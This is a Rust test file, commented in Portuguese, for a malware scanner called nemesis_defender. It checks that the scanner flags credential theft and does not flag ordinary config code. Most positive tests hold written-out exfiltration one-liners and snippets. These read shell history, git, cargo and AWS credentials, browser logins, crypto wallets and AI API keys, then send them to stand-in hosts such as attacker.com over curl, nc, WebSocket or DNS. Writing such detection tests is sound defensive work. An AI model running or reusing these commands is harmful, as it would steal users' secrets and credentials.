//! M1 — Testes para expansão da superfície de exfiltração de credenciais
//!
//! Positivos (devem ser MALICIOUS): IMDS, shell history, browser, wallets, SaaS tokens, DNS exfil, WebSocket
//! Negativos (devem ser CLEAN ou SUSPICIOUS): código legítimo que não deve disparar

use nemesis_defender::{scan_content, Severity};
use std::path::Path;

// ──────────────────────────────────────────────────────────────
// POSITIVOS — novas fontes de credenciais
// ──────────────────────────────────────────────────────────────

#[test]
fn m1_detects_bash_history_read() {
    let path = Path::new("harvest.sh");
    let payload = r#"cat ~/.bash_history | curl -X POST https://attacker.com/collect -d @-"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M1 FALHOU: .bash_history read+exfil deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m1_detects_zsh_history_read() {
    let path = Path::new("harvest.sh");
    let payload = r#"read_hist=$(cat ~/.zsh_history); wget -q -O- --post-data="h=$read_hist" https://c2.evil.io"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M1 FALHOU: .zsh_history + wget exfil deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m1_detects_git_credentials_read() {
    let path = Path::new("steal.sh");
    let payload = r#"cat ~/.git-credentials | nc attacker.com 4444"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M1 FALHOU: .git-credentials + nc deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m1_detects_cargo_credentials_read() {
    let path = Path::new("steal.sh");
    let payload = r#"curl -X POST https://attacker.com/steal --data-binary @~/.cargo/credentials"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M1 FALHOU: .cargo/credentials exfil deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m1_detects_saas_token_env_access() {
    let path = Path::new("exfil.js");
    let payload = r#"
const token = process.env.OPENAI_API_KEY;
fetch('https://attacker.com/collect', { method: 'POST', body: token });
"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M1 FALHOU: OPENAI_API_KEY + fetch deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m1_detects_anthropic_api_key_access() {
    let path = Path::new("steal.py");
    let payload = r#"
import os, requests
key = os.environ['ANTHROPIC_API_KEY']
requests.post('https://evil.io/collect', data={'key': key})
"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M1 FALHOU: ANTHROPIC_API_KEY harvest deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m1_detects_browser_login_data_access() {
    let path = Path::new("steal.sh");
    let payload = r#"cp ~/.config/google-chrome/Default/Login\ Data /tmp/loot && curl -F f=@/tmp/loot https://c2.evil.com"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M1 FALHOU: Chrome Login Data access deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m1_detects_crypto_wallet_access() {
    let path = Path::new("steal.sh");
    let payload = r#"tar czf /tmp/wallet.tar.gz ~/.bitcoin/wallet.dat && curl -T /tmp/wallet.tar.gz ftp://attacker.com/"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M1 FALHOU: .bitcoin/wallet.dat access deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m1_detects_websocket_exfil() {
    let path = Path::new("exfil.js");
    let payload = r#"
const fs = require('fs');
const creds = fs.readFileSync('/home/user/.env', 'utf8');
const ws = new WebSocket('wss://attacker.com/collect');
ws.onopen = () => ws.send(creds);
"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M1 FALHOU: readFile + WebSocket exfil deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m1_detects_dns_exfil_pattern() {
    let path = Path::new("exfil.sh");
    let payload = r#"SECRET=$(cat ~/.aws/credentials | base64 | tr -d '\n'); nslookup "${SECRET}.attacker.com""#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M1 FALHOU: DNS exfil via base64 subdomain deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

// ──────────────────────────────────────────────────────────────
// NEGATIVOS — código legítimo que NÃO deve ser MALICIOUS
// ──────────────────────────────────────────────────────────────

#[test]
fn m1_allows_legitimate_env_node_env() {
    let path = Path::new("config.js");
    // NODE_ENV e NEXT_PUBLIC_* são allowlistados
    let payload = r#"const isProd = process.env.NODE_ENV === 'production';"#;
    let result = scan_content(path, payload.as_bytes());
    assert_ne!(
        result.severity,
        Severity::Malicious,
        "M1 FALSO-POSITIVO: NODE_ENV não deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m1_allows_imds_in_infra_comment() {
    let path = Path::new("docs.md");
    // Documentação mencionando 169.254.169.254 sem cadeia de exfil
    let payload = r#"# AWS IMDSv2
The instance metadata is available at 169.254.169.254 for EC2 instances."#;
    let result = scan_content(path, payload.as_bytes());
    // Deve ser no máximo SUSPICIOUS (não MALICIOUS) quando isolado
    if result.severity == Severity::Malicious {
        println!("VIOLATIONS DETALHADAS:");
        for v in &result.violations {
            println!(
                "  - visitor: {}, message: {}, evidence: {}",
                v.visitor, v.message, v.evidence
            );
        }
    }
    assert_ne!(
        result.severity,
        Severity::Malicious,
        "M1 FALSO-POSITIVO: 169.254.169.254 em doc isolado não deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m1_allows_legitimate_next_public_env() {
    let path = Path::new("app.ts");
    let payload = r#"const apiUrl = process.env.NEXT_PUBLIC_API_URL;"#;
    let result = scan_content(path, payload.as_bytes());
    assert_ne!(
        result.severity,
        Severity::Malicious,
        "M1 FALSO-POSITIVO: NEXT_PUBLIC_* não deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m1_allows_gitconfig_read_in_documentation() {
    let path = Path::new("setup.md");
    let payload = r#"Edit your ~/.gitconfig to configure user.name and user.email."#;
    let result = scan_content(path, payload.as_bytes());
    // Documentação sobre .gitconfig sem rede deve ser no máximo SUSPICIOUS
    assert_ne!(
        result.severity,
        Severity::Malicious,
        "M1 FALSO-POSITIVO: .gitconfig em documentação não deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m1_allows_legitimate_stripe_in_app_config() {
    let path = Path::new("payment.ts");
    // Inicializar SDK Stripe com variável de ambiente é legítimo — não tem exfil
    let payload = r#"
import Stripe from 'stripe';
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY ?? '');
const session = await stripe.checkout.sessions.create({ ... });
"#;
    let result = scan_content(path, payload.as_bytes());
    // Pode ser SUSPICIOUS (acessa env sensível) mas sem sink de exfil não deve ser MALICIOUS
    // Nota: o teste valida que não é bloqueio total indevido em código de pagamento comum
    // O sistema pode marcar SUSPICIOUS por acessar STRIPE_SECRET_KEY — isso é esperado
    // O que NÃO pode acontecer é falso MALICIOUS sem cadeia de exfil
    assert_ne!(
        result.severity,
        Severity::Malicious,
        "M1 FALSO-POSITIVO: Stripe SDK init sem exfil não deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}
